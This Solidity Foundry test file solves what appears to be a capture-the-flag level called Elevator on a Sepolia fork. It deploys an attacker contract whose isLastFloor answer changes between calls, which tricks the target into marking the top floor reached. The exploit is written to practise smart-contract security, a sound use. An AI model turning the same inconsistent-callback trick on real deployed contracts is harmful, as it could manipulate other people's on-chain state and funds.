// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/11-Elevator/Elevator.sol";

contract ContractTest is Test {
    BrokenElevator BrokenElevatorContract;
    Elevator level11 = Elevator(payable(0x1D2C7438f297227e57b1FdBA9b92A67725DceC8e));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    BrokenElevatorContract = new BrokenElevator();
    }

    function testExploit11() public {

      BrokenElevatorContract.gotoFloor();
    }
  receive() external payable {}
}

contract BrokenElevator {

    Elevator level11 = Elevator(0x1D2C7438f297227e57b1FdBA9b92A67725DceC8e);
    bool public counter = false; // counter variable initially set to false

    function gotoFloor() public {
        level11.goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (!counter) { // if (true)
            counter = true; // change the counter to true
            return false; // first return value will be false
        } else {
            counter = false; // change the counter to false
            return true; // second return value will be true
        }
    }
}